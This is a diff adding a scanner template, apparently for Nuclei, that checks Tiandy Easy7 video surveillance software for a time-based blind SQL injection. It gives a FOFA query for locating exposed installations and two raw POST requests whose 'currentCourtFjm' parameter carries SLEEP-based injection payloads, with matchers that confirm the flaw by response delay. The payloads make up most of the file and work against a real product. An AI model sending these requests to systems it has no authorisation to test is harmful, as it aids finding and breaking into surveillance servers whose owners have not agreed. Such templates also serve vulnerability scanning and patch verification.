@@ -1,0 +1,29 @@
+id: easy7-queryuserbydesc-sql
+info:
+  name: 天地伟业Easy7 queryUserbyDesc SQL注入
+  author: DudePoc
+  severity: high
+  description: |-
+    fofa: app="Tiandy-Easy7"
+        天地伟业Easy7是一款用于视频监控管理的软件系统。该系统的 /Easy7/rest/inquestRoom/getCurrentUserInquestRooms_ZHGL 接口存在SQL注入漏洞，攻击者可以通过构造恶意请求执行任意SQL语句，可能导致敏感信息泄露或数据库被篡改。
+  tags: 天地伟业Easy7
+http:
+- raw:
+  - |
+    POST /Easy7/rest/inquestRoom/getCurrentUserInquestRooms_ZHGL HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    currentCourtFjm=1' AND (SELECT 6954 FROM (SELECT(SLEEP(5)))wPUM) AND 'onSs'='onSs
+  - |
+    POST /Easy7/rest/inquestRoom/getCurrentUserInquestRooms_ZHGL HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    currentCourtFjm=1' AND (SELECT 6954 FROM (SELECT(SLEEP(8)))wPUM) AND 'onSs'='onSs
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
